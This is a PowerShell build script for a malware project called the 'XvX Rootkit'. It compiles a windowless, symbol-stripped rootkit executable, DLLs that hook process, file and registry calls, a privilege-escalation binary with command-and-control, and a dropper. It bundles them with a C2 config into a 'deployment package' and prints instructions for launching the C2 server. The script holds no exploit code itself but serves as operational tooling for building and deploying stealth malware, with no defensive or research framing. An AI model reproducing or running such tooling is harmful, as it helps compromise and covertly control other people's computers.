#!/usr/bin/env pwsh
<#
.SYNOPSIS
    XvX Rootkit - Complete Build Script
    Copyright (c) 2025 - 28zaakypro@proton.me

.DESCRIPTION
    Compiles all project components:
    - rootkit.exe (main binary)
    - 3 DLL hooks (processHooks, fileHooks, registryHooks)
    - Droppers (Dropper.exe)
    - Privilege escalation binary (PrivEsc_C2.exe)

.EXAMPLE
    .\build.ps1
#>

$ErrorActionPreference = "Stop"

Write-Host "`n========================================" -ForegroundColor Cyan
Write-Host "  XvX Rootkit - Complete Build" -ForegroundColor Cyan
Write-Host "========================================`n" -ForegroundColor Cyan

$RootDir = $PSScriptRoot
$BuildSuccess = $true
$BuildErrors = @()

# ============================================================================
# 0. CLEAN BUILD - Remove all previous binaries
# ============================================================================

Write-Host "[0/7] Clean build - Removing old binaries..." -ForegroundColor Magenta

$filesToClean = @(
    "$RootDir\src\rootkit.exe",
    "$RootDir\src\main.exe",
    "$RootDir\processHooks\processHooks.dll",
    "$RootDir\fileHooks\fileHooks.dll",
    "$RootDir\registryHooks\registryHooks.dll",
    "$RootDir\dropper\Dropper.exe",
    "$RootDir\PrivEscalation\PrivEsc_C2.exe",
    "$RootDir\deploy_package\*"
)

foreach ($file in $filesToClean) {
    if (Test-Path $file) {
        Remove-Item $file -Force -Recurse -ErrorAction SilentlyContinue
        Write-Host "  [-] Removed: $(Split-Path $file -Leaf)" -ForegroundColor DarkGray
    }
}

# Remove object files
Get-ChildItem -Path $RootDir -Recurse -Filter "*.o" -ErrorAction SilentlyContinue | ForEach-Object {
    Remove-Item $_.FullName -Force
    Write-Host "  [-] Removed: $($_.Name)" -ForegroundColor DarkGray
}

Write-Host "  [+] Clean completed`n" -ForegroundColor Green

# ============================================================================
# 1. Compile rootkit.exe
# ============================================================================

Write-Host "[1/7] Compiling rootkit.exe..." -ForegroundColor Yellow

Push-Location "$RootDir\src"
try {
    # Production build: silent rootkit mode (no console, no debug)
    $output = & g++ -std=c++17 -static -static-libgcc -static-libstdc++ `
        -I"..\include" main.cpp -o rootkit.exe `
        -lwinhttp -ladvapi32 -lntdll -lpthread `
        -mwindows -DNDEBUG -O2 -s 2>&1
    
    if ($LASTEXITCODE -eq 0 -and (Test-Path "rootkit.exe")) {
        $size = (Get-Item "rootkit.exe").Length / 1KB
        Write-Host "  [+] rootkit.exe compiled successfully ($([math]::Round($size, 2)) KB)`n" -ForegroundColor Green
    } else {
        Write-Host "  [!] ERROR compiling rootkit.exe:" -ForegroundColor Red
        Write-Host $output -ForegroundColor Red
        $BuildSuccess = $false
        $BuildErrors += "rootkit.exe compilation failed"
    }
} catch {
    Write-Host "  [!] EXCEPTION: $_" -ForegroundColor Red
    $BuildSuccess = $false
    $BuildErrors += "rootkit.exe: $_"
} finally {
    Pop-Location
}

# ============================================================================
# 2. Compile processHooks.dll
# ============================================================================

Write-Host "[2/7] Compiling processHooks.dll..." -ForegroundColor Yellow

Push-Location "$RootDir\processHooks"
try {
    $output = & g++ -shared -std=c++17 -static -static-libgcc -static-libstdc++ `
        -I"..\include" dllmain.cpp -o processHooks.dll `
        -lntdll -lpthread -O2 -s 2>&1
    
    if ($LASTEXITCODE -eq 0 -and (Test-Path "processHooks.dll")) {
        $size = (Get-Item "processHooks.dll").Length / 1KB
        Write-Host "  [+] processHooks.dll compiled successfully ($([math]::Round($size, 2)) KB)`n" -ForegroundColor Green
    } else {
        Write-Host "  [!] ERROR compiling processHooks.dll:" -ForegroundColor Red
        Write-Host $output -ForegroundColor Red
        $BuildSuccess = $false
        $BuildErrors += "processHooks.dll compilation failed"
    }
} catch {
    Write-Host "  [!] EXCEPTION: $_" -ForegroundColor Red
    $BuildSuccess = $false
    $BuildErrors += "processHooks.dll: $_"
} finally {
    Pop-Location
}

# ============================================================================
# 3. Compile fileHooks.dll (with explorer.exe restart if needed)
# ============================================================================

Write-Host "[3/7] Compiling fileHooks.dll..." -ForegroundColor Yellow

Push-Location "$RootDir\fileHooks"
try {
    # Check if explorer.exe is locking the DLL
    $explorerRunning = Get-Process explorer -ErrorAction SilentlyContinue
    $restartExplorer = $false
    
    if ($explorerRunning -and (Test-Path "fileHooks.dll")) {
        Write-Host "  [i] Stopping explorer.exe temporarily..." -ForegroundColor Cyan
        Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 2
        $restartExplorer = $true
    }
    
    $output = & g++ -shared -std=c++17 -static -static-libgcc -static-libstdc++ `
        -I"..\include" dllmain.cpp -o fileHooks.dll `
        -lntdll -lpthread -O2 -s 2>&1
    
    if ($LASTEXITCODE -eq 0 -and (Test-Path "fileHooks.dll")) {
        $size = (Get-Item "fileHooks.dll").Length / 1KB
        Write-Host "  [+] fileHooks.dll compiled successfully ($([math]::Round($size, 2)) KB)" -ForegroundColor Green
    } else {
        Write-Host "  [!] ERROR compiling fileHooks.dll:" -ForegroundColor Red
        Write-Host $output -ForegroundColor Red
        $BuildSuccess = $false
        $BuildErrors += "fileHooks.dll compilation failed"
    }
    
    # Restart explorer if needed
    if ($restartExplorer) {
        Start-Sleep -Seconds 1
        Start-Process explorer
        Write-Host "  [+] explorer.exe restarted`n" -ForegroundColor Green
    } else {
        Write-Host ""
    }
} catch {
    Write-Host "  [!] EXCEPTION: $_" -ForegroundColor Red
    $BuildSuccess = $false
    $BuildErrors += "fileHooks.dll: $_"
    if ($restartExplorer) {
        Start-Process explorer
    }
} finally {
    Pop-Location
}

# ============================================================================
# 4. Compile registryHooks.dll
# ============================================================================

Write-Host "[4/7] Compiling registryHooks.dll..." -ForegroundColor Yellow

Push-Location "$RootDir\registryHooks"
try {
    $output = & g++ -shared -std=c++17 -static -static-libgcc -static-libstdc++ `
        -I"..\include" dllmain.cpp -o registryHooks.dll `
        -lntdll -lpthread -O2 -s 2>&1
    
    if ($LASTEXITCODE -eq 0 -and (Test-Path "registryHooks.dll")) {
        $size = (Get-Item "registryHooks.dll").Length / 1KB
        Write-Host "  [+] registryHooks.dll compiled successfully ($([math]::Round($size, 2)) KB)`n" -ForegroundColor Green
    } else {
        Write-Host "  [!] ERROR compiling registryHooks.dll:" -ForegroundColor Red
        Write-Host $output -ForegroundColor Red
        $BuildSuccess = $false
        $BuildErrors += "registryHooks.dll compilation failed"
    }
} catch {
    Write-Host "  [!] EXCEPTION: $_" -ForegroundColor Red
    $BuildSuccess = $false
    $BuildErrors += "registryHooks.dll: $_"
} finally {
    Pop-Location
}

# ============================================================================
# 5. Compile PrivEsc_C2.exe
# ============================================================================

Write-Host "[5/7] Compiling PrivEsc_C2.exe..." -ForegroundColor Yellow

Push-Location "$RootDir\PrivEscalation"
try {
    $output = & gcc -o PrivEsc_C2.exe PrivEsc_C2.c `
        -lwinhttp -ladvapi32 -lshell32 -lws2_32 `
        -static -O2 -s 2>&1
    
    if ($LASTEXITCODE -eq 0 -and (Test-Path "PrivEsc_C2.exe")) {
        $size = (Get-Item "PrivEsc_C2.exe").Length / 1KB
        Write-Host "  [+] PrivEsc_C2.exe compiled successfully ($([math]::Round($size, 2)) KB)`n" -ForegroundColor Green
    } else {
        Write-Host "  [!] ERROR compiling PrivEsc_C2.exe:" -ForegroundColor Red
        Write-Host $output -ForegroundColor Red
        $BuildSuccess = $false
        $BuildErrors += "PrivEsc_C2.exe compilation failed"
    }
} catch {
    Write-Host "  [!] EXCEPTION: $_" -ForegroundColor Red
    $BuildSuccess = $false
    $BuildErrors += "PrivEsc_C2.exe: $_"
} finally {
    Pop-Location
}

# ============================================================================
# 6. Compile Droppers
# ============================================================================

Write-Host "[6/7] Compiling droppers..." -ForegroundColor Yellow

Push-Location "$RootDir\dropper"
try {
    # Compile Dropper.exe (console mode with verbose output)
    Write-Host "  [i] Compiling Dropper.exe..." -ForegroundColor Cyan
    $output = & gcc -o Dropper.exe Dropper.cpp `
        -lwinhttp -lshell32 -lole32 -ladvapi32 `
        -static -O2 -s 2>&1
    
    if ($LASTEXITCODE -eq 0 -and (Test-Path "Dropper.exe")) {
        $size = (Get-Item "Dropper.exe").Length / 1KB
        Write-Host "  [+] Dropper.exe compiled ($([math]::Round($size, 2)) KB)" -ForegroundColor Green
    } else {
        Write-Host "  [!] ERROR compiling Dropper.exe:" -ForegroundColor Red
        Write-Host $output -ForegroundColor Red
        $BuildErrors += "Dropper.exe compilation failed"
    }
    
    Write-Host ""
} catch {
    Write-Host "  [!] EXCEPTION: $_" -ForegroundColor Red
    $BuildErrors += "Droppers: $_"
} finally {
    Pop-Location
}

# ============================================================================
# 7. Create Deployment Package
# ============================================================================

Write-Host "[7/7] Creating deployment package..." -ForegroundColor Yellow

$deployDir = "$RootDir\deploy_package"
if (-not (Test-Path $deployDir)) {
    New-Item -ItemType Directory -Path $deployDir | Out-Null
}

# Copy all binaries to deployment package
$deployments = @{
    "$RootDir\src\rootkit.exe" = "$deployDir\rootkit.exe"
    "$RootDir\processHooks\processHooks.dll" = "$deployDir\processHooks.dll"
    "$RootDir\fileHooks\fileHooks.dll" = "$deployDir\fileHooks.dll"
    "$RootDir\registryHooks\registryHooks.dll" = "$deployDir\registryHooks.dll"
    "$RootDir\PrivEscalation\PrivEsc_C2.exe" = "$deployDir\PrivEsc_C2.exe"
    "$RootDir\dropper\Dropper.exe" = "$deployDir\Dropper.exe"
}

# Copy C2 config if exists
if (Test-Path "$RootDir\c2_config.txt") {
    Copy-Item "$RootDir\c2_config.txt" "$RootDir\src\" -Force -ErrorAction SilentlyContinue
    Copy-Item "$RootDir\c2_config.txt" $deployDir -Force -ErrorAction SilentlyContinue
    Write-Host "  [+] c2_config.txt copied" -ForegroundColor DarkGray
}

$deployCount = 0
foreach ($source in $deployments.Keys) {
    if (Test-Path $source) {
        Copy-Item $source $deployments[$source] -Force
        $deployCount++
        Write-Host "  [+] $(Split-Path $source -Leaf) → deploy_package\" -ForegroundColor DarkGray
    }
}

Write-Host "  [+] Deployment package ready ($deployCount files)`n" -ForegroundColor Green

# ============================================================================
# BUILD SUMMARY
# ============================================================================

Write-Host "`n========================================" -ForegroundColor Cyan
if ($BuildSuccess) {
    Write-Host "  BUILD SUCCESSFUL!" -ForegroundColor Green
} else {
    Write-Host "  BUILD COMPLETED WITH ERRORS" -ForegroundColor Red
}
Write-Host "========================================`n" -ForegroundColor Cyan

Write-Host "Generated Files:" -ForegroundColor White

$files = @(
    "$RootDir\src\rootkit.exe",
    "$RootDir\processHooks\processHooks.dll",
    "$RootDir\fileHooks\fileHooks.dll",
    "$RootDir\registryHooks\registryHooks.dll",
    "$RootDir\PrivEscalation\PrivEsc_C2.exe",
    "$RootDir\dropper\Dropper.exe"
)

foreach ($file in $files) {
    if (Test-Path $file) {
        $name = Split-Path $file -Leaf
        $size = (Get-Item $file).Length / 1KB
        Write-Host "  [✓] $name".PadRight(35) -NoNewline -ForegroundColor Gray
        Write-Host "($([math]::Round($size, 2)) KB)" -ForegroundColor DarkGray
    } else {
        $name = Split-Path $file -Leaf
        Write-Host "  [✗] $name".PadRight(35) -NoNewline -ForegroundColor Red
        Write-Host "(FAILED)" -ForegroundColor Red
    }
}

if ($BuildErrors.Count -gt 0) {
    Write-Host "`nErrors Encountered:" -ForegroundColor Red
    foreach ($error in $BuildErrors) {
        Write-Host "  - $error" -ForegroundColor Red
    }
}

Write-Host "`nUsage:" -ForegroundColor Yellow
Write-Host "  Run Rootkit:   cd src && .\rootkit.exe" -ForegroundColor White
Write-Host "  Start C2:      python c2_server.py" -ForegroundColor White
Write-Host "  Web Dashboard: https://127.0.0.1:8443" -ForegroundColor White
Write-Host "  Deploy:        Use files in deploy_package\" -ForegroundColor White
Write-Host ""

if ($BuildSuccess) {
    exit 0
} else {
    exit 1
}
